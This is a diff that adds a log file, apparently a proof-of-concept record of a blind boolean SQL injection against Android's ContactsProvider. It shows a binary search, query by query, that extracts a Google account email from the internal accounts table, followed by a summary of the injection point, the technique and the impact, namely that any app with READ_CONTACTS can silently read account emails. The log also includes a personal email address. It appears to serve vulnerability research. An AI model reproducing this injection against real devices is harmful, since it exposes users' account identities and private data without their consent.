@@ -1,0 +1,188 @@
+=== ContactsProvider Blind Boolean Account Extraction ===
+Date: Tue Sep  8 00:58:05 IST 2026
+Target: accounts.account_name (length=21)
+
+pos=1: unicode>79 TRUE (range 80-126)
+pos=1: unicode>103 TRUE (range 104-126)
+pos=1: unicode>115 FALSE (range 104-115)
+pos=1: unicode>109 TRUE (range 110-115)
+pos=1: unicode>112 TRUE (range 113-115)
+pos=1: unicode>114 TRUE (range 115-115)
+pos=1: char=115 ('s') => extracted so far: 's'
+pos=2: unicode>79 TRUE (range 80-126)
+pos=2: unicode>103 FALSE (range 80-103)
+pos=2: unicode>91 TRUE (range 92-103)
+pos=2: unicode>97 FALSE (range 92-97)
+pos=2: unicode>94 TRUE (range 95-97)
+pos=2: unicode>96 TRUE (range 97-97)
+pos=2: char=97 ('a') => extracted so far: 'sa'
+pos=3: unicode>79 TRUE (range 80-126)
+pos=3: unicode>103 TRUE (range 104-126)
+pos=3: unicode>115 FALSE (range 104-115)
+pos=3: unicode>109 TRUE (range 110-115)
+pos=3: unicode>112 FALSE (range 110-112)
+pos=3: unicode>111 FALSE (range 110-111)
+pos=3: unicode>110 FALSE (range 110-110)
+pos=3: char=110 ('n') => extracted so far: 'san'
+pos=4: unicode>79 TRUE (range 80-126)
+pos=4: unicode>103 FALSE (range 80-103)
+pos=4: unicode>91 TRUE (range 92-103)
+pos=4: unicode>97 TRUE (range 98-103)
+pos=4: unicode>100 FALSE (range 98-100)
+pos=4: unicode>99 TRUE (range 100-100)
+pos=4: char=100 ('d') => extracted so far: 'sand'
+pos=5: unicode>79 TRUE (range 80-126)
+pos=5: unicode>103 TRUE (range 104-126)
+pos=5: unicode>115 FALSE (range 104-115)
+pos=5: unicode>109 FALSE (range 104-109)
+pos=5: unicode>106 FALSE (range 104-106)
+pos=5: unicode>105 FALSE (range 104-105)
+pos=5: unicode>104 TRUE (range 105-105)
+pos=5: char=105 ('i') => extracted so far: 'sandi'
+pos=6: unicode>79 TRUE (range 80-126)
+pos=6: unicode>103 TRUE (range 104-126)
+pos=6: unicode>115 TRUE (range 116-126)
+pos=6: unicode>121 FALSE (range 116-121)
+pos=6: unicode>118 TRUE (range 119-121)
+pos=6: unicode>120 TRUE (range 121-121)
+pos=6: char=121 ('y') => extracted so far: 'sandiy'
+pos=7: unicode>79 TRUE (range 80-126)
+pos=7: unicode>103 TRUE (range 104-126)
+pos=7: unicode>115 FALSE (range 104-115)
+pos=7: unicode>109 TRUE (range 110-115)
+pos=7: unicode>112 FALSE (range 110-112)
+pos=7: unicode>111 FALSE (range 110-111)
+pos=7: unicode>110 TRUE (range 111-111)
+pos=7: char=111 ('o') => extracted so far: 'sandiyo'
+pos=8: unicode>79 TRUE (range 80-126)
+pos=8: unicode>103 TRUE (range 104-126)
+pos=8: unicode>115 TRUE (range 116-126)
+pos=8: unicode>121 FALSE (range 116-121)
+pos=8: unicode>118 FALSE (range 116-118)
+pos=8: unicode>117 FALSE (range 116-117)
+pos=8: unicode>116 FALSE (range 116-116)
+pos=8: char=116 ('t') => extracted so far: 'sandiyot'
+pos=9: unicode>79 TRUE (range 80-126)
+pos=9: unicode>103 FALSE (range 80-103)
+pos=9: unicode>91 TRUE (range 92-103)
+pos=9: unicode>97 TRUE (range 98-103)
+pos=9: unicode>100 TRUE (range 101-103)
+pos=9: unicode>102 FALSE (range 101-102)
+pos=9: unicode>101 FALSE (range 101-101)
+pos=9: char=101 ('e') => extracted so far: 'sandiyote'
+pos=10: unicode>79 TRUE (range 80-126)
+pos=10: unicode>103 TRUE (range 104-126)
+pos=10: unicode>115 FALSE (range 104-115)
+pos=10: unicode>109 TRUE (range 110-115)
+pos=10: unicode>112 TRUE (range 113-115)
+pos=10: unicode>114 TRUE (range 115-115)
+pos=10: char=115 ('s') => extracted so far: 'sandiyotes'
+pos=11: unicode>79 TRUE (range 80-126)
+pos=11: unicode>103 TRUE (range 104-126)
+pos=11: unicode>115 TRUE (range 116-126)
+pos=11: unicode>121 FALSE (range 116-121)
+pos=11: unicode>118 FALSE (range 116-118)
+pos=11: unicode>117 FALSE (range 116-117)
+pos=11: unicode>116 FALSE (range 116-116)
+pos=11: char=116 ('t') => extracted so far: 'sandiyotest'
+pos=12: unicode>79 FALSE (range 32-79)
+pos=12: unicode>55 TRUE (range 56-79)
+pos=12: unicode>67 FALSE (range 56-67)
+pos=12: unicode>61 TRUE (range 62-67)
+pos=12: unicode>64 FALSE (range 62-64)
+pos=12: unicode>63 TRUE (range 64-64)
+pos=12: char=64 ('@') => extracted so far: 'sandiyotest@'
+pos=13: unicode>79 TRUE (range 80-126)
+pos=13: unicode>103 FALSE (range 80-103)
+pos=13: unicode>91 TRUE (range 92-103)
+pos=13: unicode>97 TRUE (range 98-103)
+pos=13: unicode>100 TRUE (range 101-103)
+pos=13: unicode>102 TRUE (range 103-103)
+pos=13: char=103 ('g') => extracted so far: 'sandiyotest@g'
+pos=14: unicode>79 TRUE (range 80-126)
+pos=14: unicode>103 TRUE (range 104-126)
+pos=14: unicode>115 FALSE (range 104-115)
+pos=14: unicode>109 FALSE (range 104-109)
+pos=14: unicode>106 TRUE (range 107-109)
+pos=14: unicode>108 TRUE (range 109-109)
+pos=14: char=109 ('m') => extracted so far: 'sandiyotest@gm'
+pos=15: unicode>79 TRUE (range 80-126)
+pos=15: unicode>103 FALSE (range 80-103)
+pos=15: unicode>91 TRUE (range 92-103)
+pos=15: unicode>97 FALSE (range 92-97)
+pos=15: unicode>94 TRUE (range 95-97)
+pos=15: unicode>96 TRUE (range 97-97)
+pos=15: char=97 ('a') => extracted so far: 'sandiyotest@gma'
+pos=16: unicode>79 TRUE (range 80-126)
+pos=16: unicode>103 TRUE (range 104-126)
+pos=16: unicode>115 FALSE (range 104-115)
+pos=16: unicode>109 FALSE (range 104-109)
+pos=16: unicode>106 FALSE (range 104-106)
+pos=16: unicode>105 FALSE (range 104-105)
+pos=16: unicode>104 TRUE (range 105-105)
+pos=16: char=105 ('i') => extracted so far: 'sandiyotest@gmai'
+pos=17: unicode>79 TRUE (range 80-126)
+pos=17: unicode>103 TRUE (range 104-126)
+pos=17: unicode>115 FALSE (range 104-115)
+pos=17: unicode>109 FALSE (range 104-109)
+pos=17: unicode>106 TRUE (range 107-109)
+pos=17: unicode>108 FALSE (range 107-108)
+pos=17: unicode>107 TRUE (range 108-108)
+pos=17: char=108 ('l') => extracted so far: 'sandiyotest@gmail'
+pos=18: unicode>79 FALSE (range 32-79)
+pos=18: unicode>55 FALSE (range 32-55)
+pos=18: unicode>43 TRUE (range 44-55)
+pos=18: unicode>49 FALSE (range 44-49)
+pos=18: unicode>46 FALSE (range 44-46)
+pos=18: unicode>45 TRUE (range 46-46)
+pos=18: char=46 ('.') => extracted so far: 'sandiyotest@gmail.'
+pos=19: unicode>79 TRUE (range 80-126)
+pos=19: unicode>103 FALSE (range 80-103)
+pos=19: unicode>91 TRUE (range 92-103)
+pos=19: unicode>97 TRUE (range 98-103)
+pos=19: unicode>100 FALSE (range 98-100)
+pos=19: unicode>99 FALSE (range 98-99)
+pos=19: unicode>98 TRUE (range 99-99)
+pos=19: char=99 ('c') => extracted so far: 'sandiyotest@gmail.c'
+pos=20: unicode>79 TRUE (range 80-126)
+pos=20: unicode>103 TRUE (range 104-126)
+pos=20: unicode>115 FALSE (range 104-115)
+pos=20: unicode>109 TRUE (range 110-115)
+pos=20: unicode>112 FALSE (range 110-112)
+pos=20: unicode>111 FALSE (range 110-111)
+pos=20: unicode>110 TRUE (range 111-111)
+pos=20: char=111 ('o') => extracted so far: 'sandiyotest@gmail.co'
+pos=21: unicode>79 TRUE (range 80-126)
+pos=21: unicode>103 TRUE (range 104-126)
+pos=21: unicode>115 FALSE (range 104-115)
+pos=21: unicode>109 FALSE (range 104-109)
+pos=21: unicode>106 TRUE (range 107-109)
+pos=21: unicode>108 TRUE (range 109-109)
+pos=21: char=109 ('m') => extracted so far: 'sandiyotest@gmail.com'
+
+=== FINAL RESULT: sandiyotest@gmail.com ===
+
+=== account_type extraction (length=10) ===
+account_type = 'com.google'
+account_name[1] length = 17
+
+=== COMPLETE EXTRACTION RESULTS ===
+Date: 2026-09-08
+
+Target: ContactsProvider (content://com.android.contacts/contacts)
+Method: Blind boolean SQL injection in selection parameter
+Technique: Binary search on unicode(substr(column,pos,1))>N
+
+ACCOUNTS TABLE:
+  Row 0: account_name='sandiyotest@gmail.com' (21 chars), account_type='com.google' (10 chars)
+  Row 1: account_name='attacker@evil.com' (17 chars), account_type='com.google' (10 chars)
+
+PROOF: Google account email extracted character-by-character from internal contacts database
+table that is never exposed through the ContactsProvider API.
+
+Impact: READ_CONTACTS permission → full access to internal accounts table → Google account
+email extraction. Any app with READ_CONTACTS can silently extract all account emails
+from the device by injecting SQL into the selection parameter.
+
+Each character required ~7 ADB queries (binary search over ASCII 32-126).
+Total queries for full extraction: ~21*7 + 10*7 + 17*7 + 10*7 ≈ 406 queries
